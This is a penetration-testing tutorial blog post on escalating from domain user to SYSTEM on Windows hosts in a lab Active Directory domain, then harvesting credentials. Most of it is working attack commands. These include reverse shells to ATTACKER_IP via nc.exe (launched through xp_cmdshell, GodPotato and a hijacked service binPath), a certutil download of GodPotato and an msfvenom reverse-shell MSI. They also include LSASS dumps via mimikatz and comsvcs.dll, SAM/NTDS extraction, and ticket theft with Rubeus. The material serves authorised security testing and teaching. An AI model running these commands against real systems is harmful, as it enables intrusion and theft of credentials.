---
title: "Active Directory Penetration Testing: Local Privilege Escalation - From User to SYSTEM"
date: 2026-08-15
categories: [Active Directory, Privilege Escalation]
tags: [privesc, seimpersonate, potato, printspoofer, rdp, mssql, xp_cmdshell, windows]
---

## Introduction

At this point in our engagement we have credentials for `r.nilson` - obtained through password spraying, as covered in the [first post](https://3x0t1k.github.io/posts/initial-enumeration-active-directory/). With those credentials we ran Kerberoasting against the domain and cracked `svc_sql`. That gives us access to the SQL server - svc_sql is the account we'll use there, not r.nilson directly.

This post covers an alternative path. In the [previous post](https://3x0t1k.github.io/posts/acl-abuse-dcsync/) we walked through ACL abuse as one route to Domain Admin. But ACL chains depend on what the environment gives you - sometimes there's nothing worth exploiting in the ACL, sometimes BloodHound comes back clean. In those cases you work with what you have - and what we have is svc_sql and a SQL server.

But r.nilson's credentials open other doors too. During enumeration with bloodyAD we checked group memberships and found r.nilson is a member of the `Remote Desktop Users` group on `CORP-TS01` - a terminal server inside the network.

We'll walk through two separate paths in this post. First - the SQL server path where svc_sql gives us OS command execution and its token has SeImpersonatePrivilege, giving us a path to SYSTEM. Then the terminal server where we land as a regular domain user and have to work for it. Along the way we'll cover the most common Windows local privilege escalation techniques - not as a reference list, but as things you'll actually encounter.

Terminal servers are particularly interesting targets. Multiple users are often logged in simultaneously. If privileged users have active sessions on the terminal server, compromising the host may provide an opportunity to access or abuse those sessions - depending on the host configuration, Windows build, and credential protections in place.

---

## Part 1 - svc_sql to MSSQL to SYSTEM

### Connecting to the SQL Server

We have the plaintext password for `svc_sql` from Kerberoasting. First confirm the SQL server is reachable and authenticate:

```bash
impacket-mssqlclient corp.local/svc_sql:'SqlP@ss2019!'@192.168.1.50 -windows-auth
```

Output:

```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ACK: Result: 1 - Microsoft SQL Server (150 17763)
SQL>
```

Check what privileges svc_sql has on this SQL instance:

```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
```

Output:

```
1
```

svc_sql is a sysadmin on this SQL server. This is common - service accounts running SQL are often configured as sysadmin because whoever set it up found it was the easiest way to make things work.

### Enabling xp_cmdshell

`xp_cmdshell` is a stored procedure that lets you execute OS commands from inside SQL Server. Disabled by default but a sysadmin can enable it:

```sql
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```sql
SQL> EXEC xp_cmdshell 'whoami';
```

Output:

```
corp\svc_sql
```

Check privileges on the OS level:

```sql
SQL> EXEC xp_cmdshell 'whoami /priv';
```

Output:

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`SeImpersonatePrivilege` is enabled. Before going further - get a proper shell instead of tunneling everything through SQL queries:

```bash
# Start listener
nc -lvnp 4444
```

```sql
-- Upload nc.exe first, then:
SQL> EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd';
```

Now we have an interactive shell as svc_sql. Upload GodPotato:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato.exe C:\Windows\Temp\GodPotato.exe
```

Get a SYSTEM shell on a second listener:

```bash
nc -lvnp 4445
```

```cmd
C:\Windows\Temp\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER_IP 4445 -e cmd"
```

```
nt authority\system
```

SYSTEM on the SQL server. Two shells - one as svc_sql, one as SYSTEM. From the SYSTEM shell dump local credentials and check who's logged in before moving on.

---

## Part 2 - r.nilson on the Terminal Server

With the SQL server handled, we RDP into the terminal server as r.nilson:

```bash
xfreerdp /u:r.nilson /p:'Winter2025!' /v:192.168.1.60
```

Standard domain user. No admin rights. Time to understand where we are.

### Step 1 - Who Are We and What Do We Have?

```cmd
whoami
whoami /groups
whoami /priv
```

`whoami /groups` shows every group the current user belongs to - both domain and local. Look for anything unexpected: `Backup Operators`, `Print Operators`, `Server Operators`, `Account Operators`. Any of these carry implicit privileges that aren't obvious from the account name.

`whoami /priv` is the most important check. This shows every privilege assigned to the current token:

```cmd
whoami /priv
```

Key privileges and what they mean:

| Privilege | Attack path |
|-----------|-------------|
| SeImpersonatePrivilege | Potato attacks, PrintSpoofer |
| SeAssignPrimaryTokenPrivilege | Assign a primary token to a new process - often appears alongside SeImpersonate |
| SeBackupPrivilege | Bypass file security on backup operations - Shadow Copy abuse, SAM/NTDS dump |
| SeRestorePrivilege | Bypass file security on restore operations - service binary replacement, DLL hijacking |
| SeDebugPrivilege | Open handles to protected processes - LSASS dump (subject to PPL/Credential Guard) |
| SeTakeOwnershipPrivilege | Take ownership of securable objects, then modify their permissions where applicable |
| SeLoadDriverPrivilege | Load kernel drivers - kernel exploit path |

Several of these can provide a direct or indirect path to SYSTEM, depending on the Windows build and local configuration.

### Step 2 - What System Are We On?

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

The build number matters for choosing the right tool. The hotfix list shows what's been patched.

### Step 3 - Who Else Is Here?

```cmd
query user
qwinsta
net localgroup administrators
```

`query user` and `qwinsta` show active and disconnected sessions. On a terminal server there may be multiple - if a Domain Admin or sysadmin is logged in, that becomes a target after reaching SYSTEM.

### Step 4 - What's Running and Listening?

```cmd
tasklist /v
netstat -ano
```

Processes running as SYSTEM or other users. Internal services listening on localhost. Management interfaces. All potentially useful.

---

## Automated Enumeration - WinPEAS

Before going through escalation paths manually, you can run WinPEAS to automate the search. It checks for most common misconfigurations and highlights findings in color:

```cmd
.\winPEASx64.exe
```

Worth knowing upfront: WinPEAS is a well-known tool and most EDR solutions will flag or block it. It will also generate noticeable activity on the host. Whether you run it or go fully manual depends on the scope and type of engagement - evasion vs non-evasion. In a non-evasion pentest it saves time. In a red team engagement with opsec requirements - go manual from the start. Know your rules of engagement before running anything noisy.

---

## Escalation Paths

These aren't steps in a fixed sequence. Which path is relevant depends on the privileges, software, services, and configuration found during enumeration. In a real engagement, test the cheapest and least disruptive paths first.

Now that we have the lay of the land - here are the most common paths from standard user to SYSTEM on Windows.

### Path 1 - Privileged Token Abuse (SeImpersonate / SeAssignPrimaryToken)

Already covered in Part 1. If `whoami /priv` shows `SeImpersonatePrivilege`, Potato-family techniques and PrintSpoofer are worth testing. `SeAssignPrimaryTokenPrivilege` is a separate privilege and may be useful in token-manipulation scenarios, depending on the technique and token available - but the same tooling doesn't automatically apply just because both privileges look similar.

`SeImpersonatePrivilege` lets a process impersonate a client's security context after authentication - this is the classic Potato attack vector. `SeAssignPrimaryTokenPrivilege` is a different privilege: it allows a process to assign a primary token to a newly created process. While the two often appear together, they are distinct capabilities. SeAssignPrimaryToken is less commonly the direct exploitation target but can be used alongside impersonation techniques depending on the tool and approach used.

Note: sometimes these appear as `Disabled` in `whoami /priv`. This means the token was created without that privilege active - not necessarily that the account lacks it. FullPowers.exe attempts to spawn a new process through the Service Control Manager with the full privilege set the account is entitled to. Whether this works depends on the account type and environment:

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
```

Tool selection depends on OS version, build, and available prerequisites. The ranges below are approximate - always verify against the specific target:

| Tool | Approximate compatibility |
|------|----------|
| JuicyPotato | Server 2016 and older (requires specific CLSID) |
| PrintSpoofer | Server 2019, Windows 10 (requires Print Spooler running) |
| GodPotato | Server 2012-2022, Windows 8-11 (varies by build) |
| SweetPotato | Windows 10, Server 2019 (varies by build) |

Compatibility within these ranges varies by build and configuration - always verify.

**PrintSpoofer** is worth knowing separately from the Potato family. It abuses the Windows Print Spooler service through a named pipe - it creates a named pipe server that mimics a printer, then tricks SYSTEM into connecting to it via the Spooler's pipe impersonation mechanism. When SYSTEM authenticates to the pipe, PrintSpoofer calls `ImpersonateNamedPipeClient` to steal the token, then `CreateProcessWithTokenW` to spawn a new process under that identity.

```cmd
PrintSpoofer.exe -i -c cmd
```

Works on Windows 10 and Server 2019 where JuicyPotato fails, as long as the Print Spooler service is running.

### What's Actually Happening Under the Hood

All of these tools - Potato variants, PrintSpoofer, and others - follow the same fundamental pattern at the Windows API level:

**Step 1 - Create a controlled endpoint.** The tool creates a named pipe server or COM endpoint it controls, waiting for a privileged process to connect.

**Step 2 - Coerce SYSTEM to authenticate.** Through various mechanisms (RPC calls, DCOM activation, EFS triggers, print jobs), the tool tricks a SYSTEM-level process into making an outbound authentication attempt to the controlled endpoint.

**Step 3 - Steal the token.** When SYSTEM connects, the tool calls `ImpersonateNamedPipeClient()` (for pipes) or similar APIs to assume SYSTEM's security context. This is the moment SeImpersonatePrivilege is actually used - without it, this call fails.

**Step 4 - Spawn a process.** With the SYSTEM token in hand, the tool calls `CreateProcessWithTokenW()` or `CreateProcessAsUser()` to launch a new process - cmd.exe, nc.exe, whatever - running as SYSTEM.

The differences between tools are essentially in Step 1 and Step 2 - what endpoint they create and how they coerce SYSTEM to connect to it. The privilege abuse in Steps 3 and 4 is identical across all of them.

### Path 2 - SeBackupPrivilege (Shadow Copy Abuse)

SeBackupPrivilege allows a process to bypass normal file security checks when performing backup operations. In practice this means tools using backup semantics (like `robocopy /b`) can read files that would otherwise be inaccessible due to ACLs or OS locks. Note that SeBackupPrivilege alone doesn't grant the ability to create VSS snapshots - creating a shadow copy requires additional privileges or running as an administrator. The combination of SeBackupPrivilege and robocopy /b is useful for reading from an already-existing snapshot, or when elevated enough to create one.

```cmd
:: Create diskshadow script
echo set verbose on > shadow.txt
echo set metadata C:\Temp\meta.cab >> shadow.txt
echo set context clientaccessible >> shadow.txt
echo set context persistent >> shadow.txt
echo begin backup >> shadow.txt
echo add volume C: alias tk >> shadow.txt
echo create >> shadow.txt
echo expose %tk% Z: >> shadow.txt
echo end backup >> shadow.txt
echo exit >> shadow.txt

:: Run the script
diskshadow.exe /s shadow.txt

:: Copy sensitive files from the snapshot
robocopy /b Z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit
```

Then transfer the files to the attacker machine and parse offline:

```bash
# Files copied via robocopy retain their original names: SAM, SYSTEM, SECURITY
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
# or for NTDS:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Path 3 - SeRestorePrivilege

SeRestorePrivilege allows a process to bypass normal security checks when restoring files, providing write and restore capabilities beyond ordinary ACL permissions. This can enable several escalation paths depending on what's accessible:

- Replace a service binary running as SYSTEM
- DLL hijacking on a privileged process
- Modify registry keys protected by ACL (e.g. service ImagePath)
- Set debuggers via Image File Execution Options

### Path 4 - SeDebugPrivilege

Allows a process to bypass many normal process-access restrictions, subject to protections such as PPL and Credential Guard. This enables a range of techniques including reading process memory, injecting into processes, and - the most common use in offensive contexts - dumping LSASS for credential material.

**Option 1 - Direct dump via mimikatz:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Option 2 - Dump process memory and parse offline:**

```cmd
:: Get LSASS PID
tasklist | findstr lsass

:: Dump via comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

Then parse the dump on the attacker machine with mimikatz (Windows) or pypykatz (Linux).

### Path 5 - Unquoted Service Paths

Services with spaces in their binary path that aren't quoted are vulnerable. Windows tries each space as a potential end of the executable name when starting the service.

Example - service path `C:\Program Files\Corp App\service.exe`:

Windows will try:
- `C:\Program.exe`
- `C:\Program Files\Corp.exe`
- `C:\Program Files\Corp App\service.exe`

If any of those intermediate paths are writable - drop a malicious executable there and wait for the service to restart.

Find unquoted paths:

```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```

### Path 6 - Weak Service Permissions

If you have write access to a service binary or can modify the service configuration itself - replace the executable with your own.

```cmd
.\accesschk.exe -uwcqv "r.nilson" * /accepteula
```

If you can modify a service:

```cmd
sc config VulnService binPath= "C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd"
sc stop VulnService
sc start VulnService
```

### Path 7 - Always Install Elevated

A GPO misconfiguration that lets any user install MSI packages with SYSTEM privileges. Check both registry locations:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`:

```bash
# Generate malicious MSI on attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i evil.msi
```

### Path 8 - Scheduled Tasks

Look for tasks running as SYSTEM whose binary is writable:

```cmd
schtasks /query /fo LIST /v | findstr /i "task name\run as user\task to run"
```

If the executable path is writable - replace it and wait for the next execution, or trigger it manually.

### Path 9 - DLL Hijacking

Applications load DLLs from a predictable search order. If any directory in that order is writable before the legitimate DLL location - plant a malicious DLL.

The fastest way to find candidates is Process Monitor (Procmon) filtering for `NAME NOT FOUND` results on DLL loads by privileged processes. Common pattern: application in `C:\Program Files\SomeApp\` tries to load a DLL that doesn't exist there, falls back to system directories, but checks the application directory first. If writable - you win.

### Path 10 - Kernel Exploits (Last Resort)

Only if everything else fails. Noisy, risk of crashing the system. Always check scope before using.

Check OS version and build:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Notable examples relevant to older environments:
- **PrintNightmare (CVE-2021-1675)** - Print Spooler, many unpatched systems
- **HiveNightmare (CVE-2021-36934)** - Read SAM/SYSTEM/SECURITY as regular user on Windows 10/11
- **EternalBlue (MS17-010)** - SMBv1, covered in the first post

---

## You Have SYSTEM - Now What?

We're SYSTEM on the terminal server. Our operational goal is domain compromise - getting persistent access with keys to every door. SYSTEM on a single machine is a stepping stone, not the finish line.

In a real engagement this might not be a terminal server - it could be any machine you get access to, domain-joined or not. Every host where you reach SYSTEM expands your attack surface.

Here's what SYSTEM on a domain-joined machine actually gives you:

**1. Persistence options expand significantly.** As SYSTEM you can install services, modify registry run keys, create scheduled tasks, drop files anywhere on the system. You can establish persistence that survives reboots and user logouts - something you can't do as a regular user.

**2. Access to credential material from other users.** SYSTEM lets you reach into memory and on-disk locations that are completely inaccessible to regular users. Credentials from users who have logged onto this machine - cached hashes, Kerberos tickets, plaintext passwords in some configurations - all potentially reachable.

**3. Full filesystem access.** SYSTEM has extensive local privileges and can access resources normally unavailable to standard users. Configuration files, scripts, stored credentials, private keys, password manager databases, browser profiles - most of it is reachable. Some additional protections still apply - EFS-encrypted files, protected processes, application-level encryption - but the vast majority of the filesystem is open.

**4. LDAP queries as the machine account.** If the machine is domain-joined, it has its own computer account in AD (e.g. `CORP-TS01$`). As SYSTEM you authenticate to the domain as that machine account. By default all authenticated principals - both users and computer accounts - have basic read access to most AD objects via LDAP. This means you can enumerate users, groups, SPNs, and ACLs.

This matters most when you had no domain credentials to begin with - for example you landed as a local user, escalated to SYSTEM, and now have an authenticated context in the domain you didn't have before. If you were already running as a domain user like r.nilson, you could query LDAP before escalating too - SYSTEM gives you access to credential material and memory, not specifically to LDAP.

A few caveats: some attributes are protected by default (LAPS passwords, certain sensitive attributes), and in hardened environments machine account permissions may be explicitly restricted. In most real environments basic enumeration works fine - but verify rather than assume.

The next sections cover each of these paths in detail - starting with credential material.

---

## Extracting Credential Material

This is one of the most valuable things SYSTEM access gives you. Several locations on a Windows machine contain credential material - some on disk, some in memory. Here's what each one is and how to get to it.

### SAM - Security Account Manager

SAM is a local database that stores password hashes for local user accounts on the machine. It lives at `C:\Windows\System32\config\SAM` and is locked by the OS while running - you can't just copy it.

To dump it you need SAM + SYSTEM hive together (SYSTEM contains the material from which the boot key is derived, which is used to decrypt SAM):

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```

Then transfer the files to the attacker machine (via SMB, scp, or any available method) and parse offline:

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Output:

```
[*] Target system bootKey: 0x3c2b...
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Local admin hashes can be used for Pass-the-Hash against other machines in the network. Relevant when the organisation reuses the same local administrator password across machines - a common misconfiguration. One hash, access to dozens of machines.

> **LAPS check:** If the environment has LAPS (Local Administrator Password Solution) deployed, local admin passwords are randomised per machine and rotated automatically. In that case local admin hashes from SAM are single-use. Worth checking whether LAPS is active before assuming the hash will work elsewhere.

### LSA Secrets

LSA Secrets is a separate protected area in the registry (`HKLM\SECURITY\Policy\Secrets`) that stores credentials used by services, scheduled tasks, and other system components. This is where you find:

- Service account passwords (services configured to run as a domain account store the password here)
- Machine account password

secretsdump pulls these automatically from the SECURITY hive dump above. Look for entries like:

```
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\CORP-TS01$:aes256-cts-hmac-sha1-96:a1b2c3...
[*] _SC_SomeService
CORP\svc_backup:ServiceP@ss2020!
```

LSA Secrets can contain credentials used by services and other Windows components. Depending on the secret type, these may be recoverable as plaintext credentials, hashes, keys, or other credential material. If a service is running as a domain account - its credentials are likely stored here and SYSTEM can read them.

### reg save vs Shadow Copy - What to Use When

Before moving on, here's the difference between these three approaches - they solve different problems:

**`reg save` (what we did above)** - saves a snapshot of the registry hive directly from the running registry. Works when you have SYSTEM and the hive is accessible. Fast, simple, no dependencies. The limitation: some files like NTDS.dit (the main AD database on Domain Controllers) are actively locked by the NTDS service and cannot be copied this way even as SYSTEM.

**Volume Shadow Copy (VSS)** - creates a point-in-time snapshot of the entire volume. The snapshot includes files exactly as they were at the moment of creation, bypassing the OS file locks. This is the method to use when:
- You're on a Domain Controller and need NTDS.dit (the AD database containing domain account credential material)
- `reg save` fails because the file is locked
- You don't have SYSTEM but have `SeBackupPrivilege` only - for example through membership in Backup Operators. As SYSTEM you already have SeBackupPrivilege by default, so this method works either way. But if you only have SeBackupPrivilege without SYSTEM - VSS + `robocopy /b` is your path since you can't run arbitrary commands as SYSTEM

```cmd
:: Create diskshadow script
echo set verbose on > shadow.txt
echo set metadata C:\Temp\meta.cab >> shadow.txt
echo set context clientaccessible >> shadow.txt
echo set context persistent >> shadow.txt
echo begin backup >> shadow.txt
echo add volume C: alias snap >> shadow.txt
echo create >> shadow.txt
echo expose %snap% Z: >> shadow.txt
echo end backup >> shadow.txt
echo exit >> shadow.txt

diskshadow.exe /s shadow.txt

:: Copy files from the shadow copy
robocopy /b Z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY

:: NTDS.dit only exists on Domain Controllers - skip on terminal servers/workstations
robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit
```

Then transfer the files to the attacker machine and parse offline:

```bash
# For SAM/SYSTEM/SECURITY - works on any machine
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# For NTDS.dit - only on Domain Controllers, extracts domain account credential material
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

> **Note:** NTDS.dit is the Active Directory database and only exists on Domain Controllers. On a terminal server like CORP-TS01, skip the NTDS step.

**Remote secretsdump (if you have domain admin creds)** - skips the file extraction entirely and pulls hashes directly over the network via DCSync or SMB:

```bash
impacket-secretsdump corp.local/Administrator:'P@ssw0rd!'@192.168.1.10
```

Quick rule: use `reg save` for fast local dumps, use VSS when files are locked or you need NTDS.dit, use remote secretsdump when you already have high enough privileges to skip the local work entirely.

### Cached Domain Credentials (DCC2)

When a domain user performs an interactive logon that Windows caches for offline authentication, a hash of their credentials is stored locally. These are called Domain Cached Credentials (DCC2).

secretsdump shows these too:

```
[*] Dumping cached domain logon information (domain/username:hash)
CORP/j.carter:$DCC2$10240#j.carter#a3f8c2...
CORP/t.morgan:$DCC2$10240#t.morgan#b4e9d3...
```

DCC2 hashes cannot be used for Pass-the-Hash directly - they need to be cracked first. Hashcat mode 2100:

```bash
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
```

If a privileged user has performed an interactive logon that Windows cached on this machine, their DCC2 material may be present. Worth cracking.

### LSASS - Local Security Authority Subsystem

LSASS is the process that handles authentication on Windows. It keeps credential material in memory for active sessions - and this is where things get really interesting on a terminal server.

Depending on the Windows version, logon type, and credential protections in place, LSASS may contain:

- **NTLM-derived material** for logged-in users
- **Kerberos TGTs** - tickets for active sessions, reusable directly
- **Plaintext passwords** - in older Windows versions or when WDigest is enabled

To dump LSASS you need either `SeDebugPrivilege` or SYSTEM access - as SYSTEM, SeDebugPrivilege is implicitly available.

**Option 1 - Direct dump with mimikatz:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

This runs mimikatz in-process and extracts credentials directly from LSASS memory. Loud - most EDR solutions detect this.

**Option 2 - Dump LSASS memory and parse offline:**

```cmd
:: Get LSASS PID
tasklist | findstr lsass

:: Dump via comsvcs.dll (built-in Windows, less suspicious)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```

Transfer the dump to the attacker machine and parse:

```cmd
:: Parse on Windows via mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

```bash
# Parse on Linux via pypykatz
pypykatz lsa minidump lsass.dmp
```

On a terminal server with multiple active sessions this dump may contain credential material for logged-in users. If a Domain Admin is connected and credential protections allow it, their session material may be recoverable.

> **Credential Guard:** On modern Windows (Windows 10+, Server 2016+) Microsoft Credential Guard may be enabled. It moves credential material into a Hyper-V protected container. If Credential Guard is active, commonly used LSASS-dumping techniques may fail to retrieve protected domain credentials. Check: `Get-ComputerInfo | Select-Object -Property DeviceGuardSecurityServicesRunning`

### Kerberos Ticket Extraction

LSASS doesn't only store hashes - it also caches Kerberos tickets for active sessions. This is often more valuable than hashes because:

- TGTs can be used directly for Pass-the-Ticket without knowing the password
- Kerberos ticket lifetimes are controlled by domain policy. An already-issued ticket can remain usable until it expires or is otherwise invalidated - independently of whether the account's password has changed in the meantime
- If you find a DA's TGT - you can impersonate them without knowing their password

**List all cached tickets:**

```cmd
Rubeus.exe triage
```

Output:

```
 ------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                   | Service                               | EndTime             |
 ------------------------------------------------------------------------------------------------------- 
 | 0xd42c80 | t.morgan @ CORP.COM        | krbtgt/CORP.COM                       | 17/02/2025 19:53:40 |
 | 0x692d8c | r.nilson @ CORP.COM        | krbtgt/CORP.COM                       | 17/02/2025 20:07:34 |
 | 0x3e4    | CORP-TS01$ @ CORP.COM      | krbtgt/CORP.COM                       | 17/02/2025 19:32:09 |
```

On a terminal server with multiple sessions - multiple users' TGTs may be sitting here. `krbtgt` as the service name means it's a TGT.

**Dump a specific ticket:**

```cmd
Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```

This outputs the ticket as a base64 blob. Import it on the attacker machine:

```cmd
Rubeus.exe ptt /ticket:<base64_blob>
```

Or via impacket:

```bash
# Convert kirbi to ccache format for use with impacket
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/t.morgan@corp-dc01.corp.local
```

**Why this matters on a terminal server specifically:** Admins commonly RDP into terminal servers to manage applications or users. A disconnected session doesn't mean the ticket is gone - it stays in memory until it expires. `qwinsta` may show disconnected sessions with tickets still cached from hours ago.

> **OPSEC note:** Rubeus uses Windows LSA APIs (`LsaCallAuthenticationPackage`) for ticket operations rather than relying on the same LSASS memory-reading workflow used by some credential-dumping techniques. Detection still depends heavily on the specific EDR, telemetry configuration, and the operation being performed.

### Snaffler - Finding Interesting Files Across the Network

LSASS and SAM give you credential material from the local machine. Snaffler goes wider - it searches SMB shares across the network for files that might contain credentials, private keys, config files, scripts, and other sensitive data.

It's built for exactly this scenario: you have domain credentials, you want to know what's sitting on file shares that you can now access. Rather than manually browsing every share, Snaffler automates the search and ranks findings by likely sensitivity.

```cmd
Snaffler.exe -s -o snaffler_output.log
```

`-s` enables share enumeration across the domain. Snaffler will:
- Enumerate all accessible SMB shares using your current credentials
- Search files based on name patterns, extensions, and content
- Classify and rank findings (Red/Yellow/Green based on sensitivity)

What it looks for:

- Files named `passwords.txt`, `creds.xlsx`, config files with connection strings
- Private keys (`.pem`, `.ppk`, `.key`)
- Scripts containing hardcoded credentials (`*.ps1`, `*.bat`, `*.sh`)
- KeePass databases (`.kdbx`)
- Web.config and other application config files with credentials
- SSH known_hosts and authorized_keys

Output example:

```
[Red]   \\fileserver\IT\scripts\deploy.ps1 - contains 'password' string
[Red]   \\fileserver\Backup\db_backup.config - contains connection string
[Yellow] \\fileserver\HR\employee_list.xlsx
```

Red findings are worth investigating immediately. A deployment script with a hardcoded service account password is a very common real-world finding.

> **OPSEC note:** Snaffler can generate significant SMB traffic as it reads files across shares. In an evasion-sensitive engagement, follow the agreed rules of engagement and consider limiting the scan scope to specific shares rather than running a full domain sweep.

### LaZagne - Local Credential Recovery

Where Snaffler searches file shares across the network, LaZagne focuses on the local machine - extracting passwords stored by applications installed on the current host.

Browsers, email clients, databases, SSH clients, WiFi profiles, Windows Credential Manager, development tools - all of them store credentials somewhere, and LaZagne knows where to look.

```cmd
:: Dump everything
LaZagne.exe all

:: Specific categories
LaZagne.exe browsers
LaZagne.exe mails
LaZagne.exe databases
LaZagne.exe sysadmin
```

What it recovers:

| Category | Examples |
|----------|---------|
| Browsers | Chrome, Firefox, Edge - saved passwords |
| Mail | Outlook, Thunderbird |
| Databases | MySQL, PostgreSQL, Oracle connection passwords |
| Sysadmin | PuTTY, WinSCP, FileZilla, MobaXterm |
| Windows | Credential Manager entries, some DPAPI-protected secrets (where the master key is accessible) |
| Wifi | Saved WiFi profiles with PSK |

On a terminal server admins often use RDP sessions to manage infrastructure, and they may have WinSCP, PuTTY, or other tools installed with saved credentials. A sysadmin's saved SSH key or database password can open completely new paths.

Output example:

```
[+] Password found !!!
URL: sftp://192.168.1.50
Login: admin
Password: Adm1n@Server2019!

[+] Password found !!!
URL: https://gitlab.corp.local
Login: t.morgan
Password: Morgan@GitLab2024!
```

> LaZagne is well-known and flagged by most AV/EDR. In an evasion engagement - run it from memory or use alternative approaches like manually reading browser credential databases and decrypting them offline with tools like `chromium-password-decryptor`.

---

## Summary

Two paths, one goal.

The SQL server path was clean - svc_sql had SeImpersonatePrivilege, GodPotato gave us SYSTEM in minutes. That's the fast lane when the stars align.

The terminal server path is messier and more representative of what real engagements look like. You land as a regular user, run recon, find your escalation path, reach SYSTEM, and then extract everything useful from the host before moving on.

From a single terminal server with SYSTEM access we can pull:
- Local account hashes from SAM - potentially reusable across multiple machines
- Service-related credential material from LSA Secrets - potentially including domain service accounts
- Cached domain credentials from DCC2 - worth cracking if privileged users have logged in
- Active Kerberos tickets from LSASS - Pass-the-Ticket without touching passwords
- Credentials stored by applications via LaZagne
- Sensitive files across network shares via Snaffler

Each piece of material opens new doors. A service account password from LSA Secrets might be the key to another server. A DA's TGT cached in memory is a direct path to domain compromise. A hardcoded database password in a deployment script found by Snaffler might lead somewhere nobody expected.

What to do with all of this - Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, DPAPI, and lateral movement techniques - is covered in the next post.
